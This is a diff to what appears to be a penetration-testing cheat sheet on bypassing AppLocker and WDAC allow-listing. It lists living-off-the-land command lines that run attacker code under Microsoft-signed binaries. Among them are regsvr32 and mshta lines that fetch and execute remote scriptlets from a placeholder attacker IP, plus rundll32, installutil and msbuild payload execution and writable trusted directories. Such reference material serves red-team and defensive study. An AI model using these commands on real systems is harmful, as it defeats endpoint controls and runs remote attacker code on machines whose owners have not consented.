@@ -85,10 +85,14 @@ Application allow-listing (AppLocker / WDAC) bypass
 # When only approved paths/publishers can execute, abuse trusted, signed binaries.
 # Default-rule gaps: user-writable dirs that are still allowed to execute, e.g.
 #   C:\Windows\Tasks  C:\Windows\Temp  C:\Windows\System32\spool\drivers\color
-# LOLBAS executors that run YOUR code under a Microsoft-signed binary (lolbas-project.github.io):
-powershell -ep bypass            # if PS is constrained, see CLM note below
-rundll32, regsvr32 /i:http://<your-ip>/x.sct scrobj.dll, mshta, installutil, msbuild.exe
-#   msbuild inline-task runs arbitrary C# from an .xml/.csproj — a favorite allow-list bypass
+# LOLBAS executors that run YOUR code under a Microsoft-signed binary (lolbas-project.github.io).
+# Examples (one per line — not a single command; see hacktheplanet's LOLBAS fold for syntax):
+powershell -ep bypass                                          # if PS is constrained, see CLM note below
+regsvr32 /s /n /u /i:http://<your-ip>/x.sct scrobj.dll         # remote scriptlet
+mshta http://<your-ip>/x.hta                                   # HTA host
+rundll32 shell32.dll,ShellExec_RunDLL "cmd.exe"                # proxy execution
+installutil /logfile= /logtoconsole=false /u payload.dll       # .NET installer
+msbuild evil.csproj                                            # inline-task runs arbitrary C# — favorite allow-list bypass
 # PowerShell Constrained Language Mode (CLM) rides with AppLocker -> break out via a
 # custom runspace / C# host (e.g. an unmanaged PowerShell runner) that ignores CLM.
 # DLL hijack a whitelisted app, or drop into a path the policy trusts but you can write.
